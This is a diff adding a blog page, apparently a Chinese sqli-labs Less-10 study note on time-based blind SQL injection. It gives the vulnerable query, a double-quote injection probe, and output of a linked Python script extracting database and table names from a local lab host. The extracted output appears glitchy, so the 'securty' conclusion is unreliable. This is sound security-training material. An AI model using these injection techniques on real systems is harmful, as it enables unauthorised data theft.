@@ -1,0 +1,33 @@
+<hr>
+<h2 id="title-less10url-https-www-yuque-com-u29002979-ep2zrx-uzyohqth1n60nyp0"><a href="#title-less10url-https-www-yuque-com-u29002979-ep2zrx-uzyohqth1n60nyp0" class="headerlink" title="title: less10url: https://www.yuque.com/u29002979/ep2zrx/uzyohqth1n60nyp0"></a>title: less10<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/uzyohqth1n60nyp0">https://www.yuque.com/u29002979/ep2zrx/uzyohqth1n60nyp0</a></h2><pre><code class="bash">$id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+</code></pre>
+<p>双引号闭合</p>
+<p><code>?id=1&quot;</code>显示You are in………..<br><code>?id=1&quot;</code>也显示You are in………..</p>
+<p>与Less9的区别在于闭合方式为 双引号，<br>同样是时间盲注</p>
+<p><a name="WFWr1"></a></p>
+<h1 id="使用python时间盲注脚本"><a href="#使用python时间盲注脚本" class="headerlink" title="使用python时间盲注脚本"></a>使用python时间盲注脚本</h1><p><a href="https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822269804-e683f9ad-2d5c-4eda-bfe6-cdc0578a20b1.py?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822269804-e683f9ad-2d5c-4eda-bfe6-cdc0578a20b1.py%22,%22name%22:%22time-blind.py%22,%22size%22:3709,%22type%22:%22text/x-python%22,%22ext%22:%22py%22,%22source%22:%22%22,%22status%22:%22done%22,%22mode%22:%22title%22,%22download%22:true,%22taskId%22:%22uccc0b203-7879-4264-955e-69651a58aa2%22,%22taskType%22:%22upload%22,%22__spacing%22:%22both%22,%22id%22:%22ua027682d%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">time-blind.py</a></p>
+<blockquote>
+<p>url &#x3D; ‘<a href="http://192.168.31.193/Less-10/?id=1">http://192.168.31.193/Less-10/?id=1</a>“‘</p>
+</blockquote>
+<pre><code class="bash">┌──(root㉿guoyx)-[/home/kali/sql-python]
+└─# python3 time-blind.py 
+数据库名为-&gt;s
+数据库名为-&gt;se
+数据库名为-&gt;sec
+数据库名为-&gt;secu
+数据库名为-&gt;secur
+数据库名为-&gt;secur
+数据库名为-&gt;securt
+数据库名为-&gt;securty
+第一个表为-&gt;e
+第一个表为-&gt;em
+第一个表为-&gt;ema
+第一个表为-&gt;emai
+第二个表为-&gt;f
+第二个表为-&gt;fe
+第三个表为-&gt;s
+字段二为-&gt;H
+字段二为-&gt;H*
+</code></pre>
+<p>数据库名为securty</p>
